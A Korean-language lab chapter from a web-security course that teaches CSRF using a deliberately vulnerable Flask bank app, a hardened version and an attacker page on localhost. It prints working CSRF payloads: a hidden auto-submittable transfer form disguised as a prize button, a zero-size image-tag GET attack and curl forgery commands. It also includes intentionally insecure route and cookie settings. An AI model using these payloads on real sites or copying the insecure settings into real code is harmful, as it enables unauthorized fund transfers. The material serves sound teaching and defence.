# Chapter 06: CSRF (Cross-Site Request Forgery) 실습

## 학습 목표
- CSRF 공격의 원리와 위험성 이해
- CSRF 토큰을 이용한 방어 구현
- SameSite 쿠키 설정 방법 습득

## CSRF란?

CSRF(Cross-Site Request Forgery)는 사용자가 로그인된 상태에서, 공격자가 만든 악성 웹페이지를 방문하면
사용자의 의도와 무관하게 요청이 전송되는 공격입니다.

**핵심 원리:** 브라우저는 쿠키를 자동으로 포함하여 요청을 전송하므로,
로그인 상태의 사용자가 공격 페이지를 방문하면 인증된 요청이 자동 실행됩니다.

## 실습 환경

```bash
cd ch06-csrf
docker-compose up -d
```

**서비스 구성:**

| 서비스 | URL | 설명 |
|--------|-----|------|
| vulnerable | http://localhost:5001 | CSRF 취약한 은행 서비스 |
| secure | http://localhost:5002 | CSRF 방어가 적용된 은행 서비스 |
| attacker | http://localhost:9000/attacker.html | 공격자의 악성 웹서버 |

**테스트 계정:**

| 사용자 | 초기 잔액 |
|--------|----------|
| `alice` | 1,000원 |
| `bob` | 1,000원 |

> 로그인 시 Username만 입력하면 됩니다 (비밀번호 없음)

## 실습 파일

```
ch06-csrf/
├── vulnerable/
│   └── app.py              # CSRF 취약한 코드
├── secure/
│   └── app.py              # CSRF 방어 코드 (Flask-WTF)
├── attacker.html            # 공격자 페이지
├── docker-compose.yml       # 3개 서비스 (vulnerable, secure, attacker)
├── Dockerfile
├── test_app.py              # pytest 테스트
├── test_bandit.sh           # Bandit 정적 분석 스크립트
└── requirements.txt
```

## 취약점 비교

| 항목 | 취약한 버전 (5001) | 안전한 버전 (5002) |
|------|-------------------|-------------------|
| CSRF 토큰 | 없음 | Flask-WTF 자동 검증 |
| 송금 HTTP 메서드 | GET + POST 모두 허용 | POST만 허용 |
| SameSite 쿠키 | `SameSite=None` (모든 사이트에서 쿠키 전송) | `SameSite=Strict` (동일 사이트만 허용) |
| secret_key | 하드코딩 (`"secret"`) | `os.urandom(32)` 랜덤 생성 |

## 공격 실습 (취약한 버전)

### 단계 1: Docker 서비스 시작

```bash
cd ch06-csrf
docker-compose up -d
```

3개의 서비스가 시작됩니다:
- `vulnerable` (포트 5001) — 취약한 은행 서비스
- `secure` (포트 5002) — 안전한 은행 서비스
- `attacker` (포트 9000) — 공격자 웹서버 (`attacker.html` 호스팅)

### 단계 2: 피해자(alice) 로그인

1. 브라우저에서 http://localhost:5001 접속
2. Username에 `alice` 입력 후 Login 클릭
3. 잔액 **1,000원** 확인

### 단계 3: 공격 페이지 열기

**같은 브라우저**의 새 탭에서 http://localhost:9000/attacker.html 접속

> **중요:** `attacker.html`을 로컬 파일(`file://`)로 열면 **쿠키가 전송되지 않아 공격이 실패**합니다.
> 반드시 `http://localhost:9000/attacker.html` 으로 접속해야 합니다.

### 단계 4: 공격 실행 및 결과 확인

1. 공격 페이지에서 **"경품 수령하기"** 버튼을 클릭합니다
2. 숨겨진 송금 폼이 `http://localhost:5001/transfer`로 제출됩니다
3. http://localhost:5001 로 돌아가서 잔액을 확인합니다
4. **alice의 잔액이 1,000원 → 500원으로 감소** (공격 성공!)

> **브라우저 참고:** Chrome에서 동작하지 않으면 **Firefox**를 사용하세요.
> `SameSite=None` + HTTP(비 HTTPS) 환경은 Firefox에서 더 잘 동작합니다.

### 공격이 성공하는 이유

```
[1. alice가 은행 사이트에 로그인]
    → 브라우저에 세션 쿠키 저장됨 (SameSite=None)

[2. alice가 공격자 페이지를 방문 (localhost:9000)]
    → "경품 수령하기" 버튼 클릭
    → 숨겨진 <form>이 localhost:5001/transfer로 POST 전송
    → 브라우저가 세션 쿠키를 자동 포함! (SameSite=None이므로)

[3. 은행 서버가 요청 수신 (localhost:5001)]
    → 유효한 세션 쿠키 확인 → alice의 요청으로 인식
    → CSRF 토큰 검증 없음 → 송금 실행!

[4. 결과]
    → alice의 계좌에서 attacker에게 500원이 송금됨
    → alice는 자신이 송금했다는 사실을 모름
```

### 공격 페이지 (attacker.html) 코드

```html
<!-- attacker.html - CSRF 공격 페이지 -->
<html>
<body>
<h1>축하합니다! 경품에 당첨되었습니다!</h1>
<p>아래 버튼을 클릭하면 경품이 지급됩니다.</p>

<!-- 숨겨진 송금 폼: 사용자에게는 "경품 수령" 버튼으로 보임 -->
<form id="csrf_form" action="http://localhost:5001/transfer" method="POST">
    <input type="hidden" name="to" value="attacker">
    <input type="hidden" name="amount" value="500">
    <button type="submit">경품 수령하기</button>
</form>

<!-- 자동 제출 버전 (주석 해제 시 페이지 열면 즉시 송금됨) -->
<!--
<script>document.getElementById('csrf_form').submit();</script>
-->
</body>
</html>
```

### curl을 이용한 공격 테스트

```bash
# 1. 로그인하여 세션 쿠키 획득
curl.exe -c cookies.txt -X POST http://localhost:5001/login \
  -d "username=alice" -L

# 2. 정상 송금 (alice → bob 100원)
curl.exe -b cookies.txt -X POST http://localhost:5001/transfer \
  -d "to=bob&amount=100" -L

# 3. CSRF 공격 시뮬레이션 (alice → attacker 500원)
# 실제 공격에서는 공격자 페이지가 이 요청을 대신 전송
curl.exe -b cookies.txt -X POST http://localhost:5001/transfer \
  -d "to=attacker&amount=500" -L
```

### GET 요청을 이용한 공격 (이미지 태그)

취약한 버전은 GET 요청도 허용하므로, 이미지 태그만으로도 공격 가능합니다:

```html
<!-- 피해자가 이 이미지가 포함된 페이지를 방문하면 자동 송금됨 -->
<img src="http://localhost:5001/transfer?to=attacker&amount=500" width="0" height="0">
```

**취약한 코드 (GET + POST 허용):**
```python
@app.route("/transfer", methods=["GET", "POST"])  # GET도 허용 → 이미지 태그 공격 가능
def transfer():
    to = request.values.get("to", "")       # GET 파라미터도 읽음
    amount = int(request.values.get("amount", 0))
```

## 방어 확인 (안전한 버전)

### 안전한 버전에서 동일한 공격 시도

1. 브라우저에서 http://localhost:5002 접속
2. `alice`로 로그인
3. 공격 페이지에서 포트를 5002로 변경하여 공격 시도
4. **400 Bad Request 에러 발생** — CSRF 토큰이 없으므로 요청 거부
5. 추가로 `SameSite=Strict` 쿠키이므로 다른 사이트에서 쿠키 자체가 전송되지 않음

### curl로 CSRF 방어 확인

```bash
# CSRF 토큰 없이 송금 요청 → 400 에러 (방어 성공)
curl.exe -X POST http://localhost:5002/transfer \
  -d "to=attacker&amount=100"
```

**안전한 버전이 방어하는 이유:**

| 방어 계층 | 설명 |
|-----------|------|
| CSRF 토큰 | 모든 폼에 `csrf_token` 필드 필수 — 공격자는 토큰값을 모름 |
| POST만 허용 | `<img>` 태그 공격 불가 |
| SameSite=Strict | 다른 사이트에서 쿠키 자체가 전송되지 않음 |

## 방어 기법

### 1. Flask-WTF CSRF 보호

```python
from flask_wtf import CSRFProtect

app = Flask(__name__)
app.secret_key = os.urandom(32)  # 랜덤 시크릿 키
csrf = CSRFProtect(app)          # 모든 POST 요청에 CSRF 토큰 자동 검증
```

### 2. 템플릿에 CSRF 토큰 추가

```html
<form action="/transfer" method="POST">
    <!-- 이 토큰이 없으면 400 Bad Request -->
    <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
    <input name="to" placeholder="받는 사람">
    <input name="amount" type="number" placeholder="금액">
    <button type="submit">송금</button>
</form>
```

### 3. POST 요청만 허용

```python
# 취약: GET + POST 모두 허용 → <img> 태그로 공격 가능
@app.route("/transfer", methods=["GET", "POST"])

# 안전: POST만 허용
@app.route("/transfer", methods=["POST"])
```

### 4. SameSite 쿠키 설정

```python
# 취약: 모든 사이트에서 쿠키 전송 허용
app.config['SESSION_COOKIE_SAMESITE'] = 'None'

# 안전: 동일 사이트에서만 쿠키 전송
app.config['SESSION_COOKIE_SAMESITE'] = 'Strict'
```

## 테스트 방법

### 1. pytest 실행

```bash
cd ch06-csrf
python -m pytest test_app.py -v
```

**예상 출력:**
```
test_app.py::TestVulnerableApp::test_index PASSED                    [ 50%]
test_app.py::TestSecureApp::test_index PASSED                        [100%]

============================== 2 passed in 0.35s ==============================
```

**참고:**
- CSRF 공격은 브라우저 세션(쿠키 자동 전송)을 이용하므로, pytest로는 완전한 테스트가 불가능합니다
- 실제 공격 테스트는 위의 **공격 실습** 섹션을 참고하세요

**개별 테스트 실행:**
```bash
python -m pytest test_app.py::TestVulnerableApp -v
python -m pytest test_app.py::TestSecureApp -v
```

### 2. Bandit 정적 분석

```bash
cd ch06-csrf

# 자동 스캔 (취약한 코드 vs 안전한 코드 비교)
bash test_bandit.sh

# 또는 수동 실행
python -m bandit -r vulnerable/ -ll
python -m bandit -r secure/ -ll
```

**예상 결과:**

| 코드 | Bandit 결과 |
|------|------------|
| `vulnerable/app.py` | B105: 하드코딩된 secret_key, B201: debug=True |
| `secure/app.py` | 취약점 없음 |

### 3. 수동 테스트 (브라우저)

#### 취약한 버전 테스트
1. http://localhost:5001 접속 → `alice`로 로그인
2. 잔액 1,000원 확인
3. **동일 브라우저 새 탭**에서 http://localhost:9000/attacker.html 접속
4. "경품 수령하기" 클릭 → 잔액 500원으로 감소 확인 (공격 성공)

#### 안전한 버전 테스트
1. http://localhost:5002 접속 → `alice`로 로그인
2. 잔액 1,000원 확인
3. 공격 페이지에서 포트를 5002로 변경하여 공격 시도
4. 400 에러 발생 확인 (방어 성공)
5. 브라우저 개발자 도구(F12) → 소스에서 `csrf_token` 필드 확인

### 4. 트러블슈팅

| 문제 | 원인 | 해결 방법 |
|------|------|-----------|
| "Not logged in" 반환 | `file://`로 열면 쿠키 미전송 | `http://localhost:9000/attacker.html`로 접속 |
| Chrome에서 공격 실패 | Chrome이 SameSite=None + HTTP 차단 | Firefox 사용 |
| 잔액이 변하지 않음 | Docker 재시작 시 DB 초기화 필요 | `docker-compose down && docker-compose up -d` |

## 체크리스트
- [ ] 모든 상태 변경 요청에 CSRF 토큰 적용
- [ ] POST 요청만 허용 (GET으로 상태 변경 금지)
- [ ] SameSite=Strict 쿠키 설정
- [ ] secret_key를 환경변수로 관리 (하드코딩 금지)
- [ ] debug=False 설정 (프로덕션)

## 참고 자료
- [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [Flask-WTF CSRF Protection](https://flask-wtf.readthedocs.io/en/stable/csrf.html)
- [SameSite Cookie MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite)
